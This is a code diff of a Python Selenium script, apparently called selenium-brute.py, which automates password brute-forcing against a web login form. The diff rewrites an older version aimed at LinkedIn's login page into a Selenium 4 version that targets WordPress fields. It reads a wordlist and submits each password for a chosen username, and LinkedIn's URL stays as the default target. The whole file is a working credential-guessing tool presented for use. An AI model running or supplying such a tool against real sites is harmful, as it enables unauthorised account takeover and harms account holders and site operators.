@@ -1,49 +1,63 @@
-from selenium import webdriver 
+"""
+Usage:
+    python selenium-brute.py -h
+    python selenium-brute.py -t http://localhost/wp-login.php -u admin -p password.txt
+"""
+
+from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
 from optparse import OptionParser
 import sys
 
+# Argument parser
 parser = OptionParser()
-parser.add_option("-t",dest="target", 
-                  help="target's url: https://www.linkedin.com/uas/login", default="https://www.linkedin.com/uas/login")
-parser.add_option("-u",dest="user", 
-                  help="username", default="test")
-parser.add_option("-p",
-                  dest="pas",
-                  help="wordlist: for example password.txt")
+parser.add_option("-t", dest="target", help="target's URL", default="https://www.linkedin.com/uas/login")
+parser.add_option("-u", dest="user", help="username", default="test")
+parser.add_option("-p", dest="pas", help="wordlist file (e.g., password.txt)")
 (options, args) = parser.parse_args(sys.argv)
 
-url = options.target					
-curuser=options.user
-file= options.pas
+# Get CLI inputs
+url = options.target
+curuser = options.user
+file = options.pas
 
-passwords=[]
+# Read passwords from file
+passwords = []
 with open(file, "r") as s:
-	for i in s:
-		passwords.append(i)
-		
+    passwords = [line.strip() for line in s if line.strip()]
 
-def	loginuserpass(passw):
-	m=driver.current_url	
-	username = driver.find_element_by_id("username")		
-	username.clear()
-	print("username: "+curuser)
-	username.send_keys(curuser)		
-	password = driver.find_element_by_id("password")
-	password.clear()
-	print("password: "+passw+"\n")
-	password.send_keys(passw)			
-	driver.find_element_by_class_name('login__form_action_container').click()
-	n=driver.current_url
-	print n
-    
-driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
+# Start Chrome with Selenium 4
 chrome_options = Options()
+service = Service(r'chromedriver.exe')
+driver = webdriver.Chrome(service=service, options=chrome_options)
+
+# Open target login page
 driver.get(url)
 
+# Brute force function
+def loginuserpass(passw):
+    print(f"Trying -> username: {curuser} | password: {passw}")
 
-for i in range(len(passwords)):
-	loginuserpass(passwords[i])
-	i+=1
+    # Find and fill in username
+    username = driver.find_element(By.ID, "user_login")
+    username.clear()
+    username.send_keys(curuser)
 
+    # Find and fill in password
+    password = driver.find_element(By.ID, "user_pass")
+    password.clear()
+    password.send_keys(passw)
 
+    # Click login button
+    driver.find_element(By.ID, "wp-submit").click()
+
+    # Print new URL to check if login succeeded
+    print("Redirected to:", driver.current_url)
+    print("-" * 40)
+
+# Loop through password list
+for pw in passwords:
+    loginuserpass(pw)
+    driver.get(url)  # Reload login page between attempts
